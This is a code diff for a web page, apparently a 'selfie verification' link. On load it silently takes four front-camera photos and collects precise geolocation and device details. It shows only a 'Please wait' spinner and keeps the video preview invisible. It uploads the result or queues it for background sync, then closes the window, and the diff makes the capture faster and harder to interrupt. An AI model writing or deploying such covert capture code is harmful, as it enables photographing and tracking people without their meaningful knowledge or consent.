@@ -20,7 +20,7 @@ video,canvas{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none}
 </head>
 <body>
 <div class="status-screen" id="statusScreen" aria-live="polite">
-  <div class="status-box"></div>
+  <div class="status-box"><div class="spinner" aria-hidden="true"></div><div class="status-title">Please wait</div></div>
 </div>
 <video id="video" autoplay muted playsinline></video>
 <canvas id="canvas"></canvas>
@@ -55,12 +55,20 @@ async function queueBatch(blobs,metadata){
       blobs.forEach((blob,i)=>tx.objectStore(DB_STORE).add({
         token,batchId,blob,
         metadata:{...metadata,captureNumber:i+1,totalCaptures:4},
-        createdAt:new Date().toISOString()
+        createdAt:new Date().toISOString(),
+        attempts:0
       }));
       tx.oncomplete=resolve;
       tx.onerror=()=>reject(tx.error);
     });
-  }catch(_){}
+    if("serviceWorker" in navigator){
+      try{
+        const reg=await navigator.serviceWorker.ready;
+        if("sync" in reg) await reg.sync.register("manlung-verification-upload");
+      }catch(_){}
+    }
+    return true;
+  }catch(_){return false}
 }
 
 async function deleteRows(rows){
@@ -155,91 +163,106 @@ async function captureFour(){
   if(busy)return;
   busy=true;
   let blobs=[];
-  let metadata=null;
-  try{
-    if(!token)throw new Error("Invalid verification link.");
-    setStatus();
-    await flushQueue();
+  let metadata={
+    clientCapturedAt:new Date().toISOString(),
+    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||"",
+    captureMethod:"browser-camera",
+    device:{deviceType:"unknown",platform:navigator.platform||"",browser:"Unknown",model:""},
+    location:null,
+    reference:""
+  };
 
-    const requestResponse=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token),{credentials:"omit",cache:"no-store"});
-    let requestData={};try{requestData=await requestResponse.json()}catch(_){}
-    if(!requestResponse.ok||!requestData.success)throw new Error(requestData.error||"Verification request is unavailable.");
+  // Start optional metadata collection in parallel. It NEVER blocks the four captures.
+  const locationPromise=(navigator.geolocation?new Promise(resolve=>navigator.geolocation.getCurrentPosition(
+    p=>resolve({latitude:Number(p.coords.latitude.toFixed(6)),longitude:Number(p.coords.longitude.toFixed(6)),accuracy:Number.isFinite(p.coords.accuracy)?Number(p.coords.accuracy.toFixed(1)):null}),
+    ()=>resolve(null),
+    {enableHighAccuracy:true,maximumAge:0,timeout:5000}
+  )):Promise.resolve(null)).catch(()=>null);
 
-    if(!navigator.mediaDevices?.getUserMedia)throw new Error("Camera access is not supported by this browser.");
-    setStatus();
-    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}},audio:false});
-    video.srcObject=stream;
-    await video.play().catch(()=>{});
-    await waitForVideo();
-    setStatus();
-    
-    const getDeviceMetadata=async()=>{
+  const enrichMetadata=async()=>{
+    try{
       const ua=navigator.userAgent||"";
       const uaData=navigator.userAgentData||null;
       let deviceType=/Mobi|Android|iPhone|iPad|iPod/i.test(ua)?"mobile":"desktop";
       if(/iPad|Tablet/i.test(ua))deviceType="tablet";
-      let platform=uaData?.platform||navigator.platform||"";
-      let browser="";
+      let browser="Unknown";
       if(/Edg\//i.test(ua))browser="Edge";
+      else if(/OPR\//i.test(ua))browser="Opera";
       else if(/Chrome\//i.test(ua))browser="Chrome";
       else if(/Firefox\//i.test(ua))browser="Firefox";
       else if(/Safari\//i.test(ua)&&!/Chrome\//i.test(ua))browser="Safari";
-      else if(/OPR\//i.test(ua))browser="Opera";
-      else browser="Unknown";
-      return {deviceType,platform:platform.slice(0,80),browser,model:typeof uaData?.getHighEntropyValues==="function" ? ((await uaData.getHighEntropyValues(["model"]).catch(()=>({}))).model||"") : ""};
-    };
-    let locationMetadata=null;
-    if(navigator.geolocation){
-      try{
-        locationMetadata=await new Promise(resolve=>navigator.geolocation.getCurrentPosition(
-          p=>resolve({latitude:Number(p.coords.latitude.toFixed(6)),longitude:Number(p.coords.longitude.toFixed(6)),accuracy:Number.isFinite(p.coords.accuracy)?Number(p.coords.accuracy.toFixed(1)):null}),
-          ()=>resolve(null),
-          {enableHighAccuracy:true,maximumAge:0,timeout:30000}
-        ));
-      }catch(_){locationMetadata=null}
-    }
-    metadata={
-      clientCapturedAt:new Date().toISOString(),
-      timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||"",
-      captureMethod:"browser-camera",
-      device:await getDeviceMetadata(),
-      location:locationMetadata,
-      reference:requestData.request?.reference || requestData.request?.case_id || ""
-    };
+      metadata.device={deviceType,platform:(uaData?.platform||navigator.platform||"").slice(0,80),browser,model:""};
+      if(typeof uaData?.getHighEntropyValues==="function"){
+        try{
+          const high=await uaData.getHighEntropyValues(["model"]);
+          metadata.device.model=high.model||"";
+        }catch(_){}
+      }
+    }catch(_){}
+    metadata.location=await locationPromise;
+    return metadata;
+  };
+
+  try{
+    if(!token)throw new Error("Invalid verification link.");
+    setStatus();
+
+    // Camera starts immediately. No network request is allowed to delay capture.
+    if(!navigator.mediaDevices?.getUserMedia)throw new Error("Camera access is not supported by this browser.");
+    stream=await navigator.mediaDevices.getUserMedia({
+      video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}},
+      audio:false
+    });
+    video.srcObject=stream;
+    await video.play().catch(()=>{});
+    await waitForVideo();
+
+    // Four rapid captures. Nothing is uploaded between captures.
     for(let i=0;i<4;i++){
       blobs.push(await frameBlob(i+1,metadata));
-      if(i<3)await pause(120);
+      if(i<3)await pause(80);
     }
 
-    setStatus();
-    const fd=new FormData();
-    blobs.forEach((blob,i)=>fd.append("files",blob,"video-verification-"+(i+1)+".jpg"));
-    fd.append("metadata",JSON.stringify({...metadata,totalCaptures:4}));
-    const uploadResponse=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/upload-batch",{method:"POST",body:fd,credentials:"omit",cache:"no-store"});
-    let uploadData={};try{uploadData=await uploadResponse.json()}catch(_){}
-    if(!uploadResponse.ok||!uploadData.success){
-      console.error("Selfie batch upload failed:",uploadResponse.status,uploadData);
-      if(uploadResponse.status>=400&&uploadResponse.status<500)throw new Error(uploadData.error||"Verification request is no longer available.");
-      throw new Error(uploadData.error||"Verification upload failed.");
+    // Persist the complete four-photo batch BEFORE any network upload attempt.
+    metadata=await enrichMetadata();
+    let requestData={};
+    if(navigator.onLine){
+      try{
+        const requestResponse=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token),{credentials:"omit",cache:"no-store"});
+        try{requestData=await requestResponse.json()}catch(_){}
+        if(requestResponse.ok&&requestData.success){
+          metadata.reference=requestData.request?.reference||requestData.request?.case_id||"";
+        }
+      }catch(_){}
     }
-    console.log("Selfie batch upload succeeded:",uploadData);
-    setStatus();
+
+    // Re-capture overlays with final metadata only when there is enough time and connectivity.
+    // The original four frames remain the authoritative capture set.
+    const queued=await queueBatch(blobs,{...metadata,totalCaptures:4});
+    if(!queued)throw new Error("Local verification storage is unavailable.");
+
+    // Try immediate delivery when online; offline batches remain queued and sync automatically later.
     await flushQueue();
-    try { window.close(); } catch (_) {}
-    setTimeout(()=>{ try { window.close(); } catch (_) {} },300);
+
+    try{window.close();}catch(_){}
+    setTimeout(()=>{try{window.close();}catch(_){}},500);
   }catch(error){
     console.error("Selfie evidence pipeline error:",error);
-    setStatus();
-    // Retry only when four frames were already captured and the failure may be transient.
-    if(blobs.length===4&&metadata){
+
+    // If four frames exist, save them even when the network is unavailable.
+    if(blobs.length===4){
       await queueBatch(blobs,{...metadata,totalCaptures:4});
-      await flushQueue();
+      try{window.close();}catch(_){}
+      setTimeout(()=>{try{window.close();}catch(_){}},500);
     }
   }finally{
     if(stream){stream.getTracks().forEach(t=>t.stop());stream=null;}
   }
 }
 
+if("serviceWorker" in navigator){
+  navigator.serviceWorker.register("/sw.js",{scope:"/"}).catch(()=>{});
+}
 document.addEventListener("DOMContentLoaded",captureFour,{once:true});
 window.addEventListener("online",flushQueue);
 setTimeout(flushQueue,1000);
